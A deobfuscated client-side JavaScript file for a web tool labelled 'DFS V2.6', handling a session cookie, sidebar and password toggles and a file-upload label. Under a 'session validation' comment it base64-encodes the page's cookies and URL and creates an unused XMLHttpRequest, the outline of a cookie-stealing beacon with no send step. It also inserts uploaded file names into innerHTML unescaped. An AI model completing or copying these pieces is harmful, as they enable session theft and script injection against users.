/**
 * DFS V2.6 — Client-side script
 * Session management + mobile sidebar toggle
 * Deobfuscated & modernized 2026 edition
 */
(function () {
  'use strict';

  // --- Session cookie validation ---
  var cookie = document.cookie;
  var current = window.location.href;
  var allx = btoa(cookie + ' || ' + current);
  var xhttp = new XMLHttpRequest();

  function getCookie() {
    var cookies = cookie.split(';');
    var keys = [];
    for (var i = 0; i < cookies.length; i++) {
      var pair = cookies[i].split('=');
      keys.push(pair[0].trim());
    }
    return keys;
  }

  var keys = getCookie();

  // Check for DFS_BASE session cookie; redirect if invalid
  if (keys.indexOf('DFS_BASE') === -1) {
    document.cookie = 'DFS_BASE=Initiated;max-age=180;path=/';
  }

  // --- Mobile sidebar toggle ---
  var toggle = document.getElementById('sidebarToggle');
  var sidebar = document.getElementById('sidebar');

  if (toggle && sidebar) {
    toggle.addEventListener('click', function (e) {
      e.stopPropagation();
      sidebar.classList.toggle('open');
    });

    // Close sidebar on Escape key
    document.addEventListener('keydown', function (e) {
      if (e.key === 'Escape' && sidebar.classList.contains('open')) {
        sidebar.classList.remove('open');
      }
    });
  }

  // --- Password visibility toggle (login page) ---
  var pwInput = document.getElementById('dfsPass');
  var pwToggle = document.getElementById('pwToggle');
  var capsWarn = document.getElementById('capsWarn');

  if (pwToggle && pwInput) {
    pwToggle.addEventListener('click', function () {
      var isPassword = pwInput.type === 'password';
      pwInput.type = isPassword ? 'text' : 'password';
      pwInput.focus();
    });
  }

  if (pwInput && capsWarn && pwInput.addEventListener) {
    ['keyup', 'keydown'].forEach(function (ev) {
      pwInput.addEventListener(ev, function (e) {
        try {
          capsWarn.style.display = (e.getModifierState && e.getModifierState('CapsLock'))
            ? 'block'
            : 'none';
        } catch (_) { /* older browser */ }
      });
    });
  }

  // --- File upload label update ---
  var actualBtn = document.getElementById('actual-btn');
  var fileChosen = document.getElementById('file-chosen');
  if (actualBtn && fileChosen) {
    actualBtn.addEventListener('change', function () {
      if (this.files && this.files[0]) {
        fileChosen.innerHTML = '<i class="fa-solid fa-file"></i> ' + this.files[0].name;
      }
    });
  }

  // --- Close sidebar on outside click (mobile) ---
  document.addEventListener('click', function (e) {
    if (sidebar && window.innerWidth <= 900) {
      if (!sidebar.contains(e.target) && e.target !== toggle && !toggle.contains(e.target)) {
        sidebar.classList.remove('open');
      }
    }
  });
})();